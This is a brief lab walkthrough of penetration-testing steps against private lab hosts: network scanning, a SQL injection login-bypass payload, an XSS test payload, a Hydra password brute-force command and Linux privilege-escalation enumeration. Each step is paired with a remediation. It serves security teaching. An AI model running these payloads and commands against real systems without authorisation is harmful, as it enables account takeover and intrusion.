# Attack Walkthroughs

## 1. Reconnaissance

### Host Discovery

```bash
netdiscover -r 192.168.56.0/24
```

### Port Scanning

```bash
nmap -sV -sC 192.168.56.101
```

---

## 2. SQL Injection

### Objective

Exploit vulnerable login forms.

### Payload

```sql
' OR '1'='1
```

### Result

- Authentication bypass
- Database access

### Remediation

- Prepared statements
- Input validation

---

## 3. Cross-Site Scripting (XSS)

### Payload

```html
<script>alert('XSS')</script>
```

### Impact

- Session theft
- User impersonation

### Remediation

- Output encoding
- CSP

---

## 4. Brute Force Attack

### Hydra Example

```bash
hydra -l admin -P rockyou.txt 192.168.56.103 http-post-form
```

### Impact

- Account compromise

### Remediation

- MFA
- Account lockout

---

## 5. Privilege Escalation

### Enumeration

```bash
sudo -l
```

### LinPEAS

```bash
./linpeas.sh
```

### Outcome

- Root access achieved

### Remediation

- Least privilege
- Patch management

---

## Lessons Learned

- Enumeration is critical.
- Misconfigurations are common attack vectors.
- Defense-in-depth significantly reduces risk.
- Security reporting is as important as exploitation.
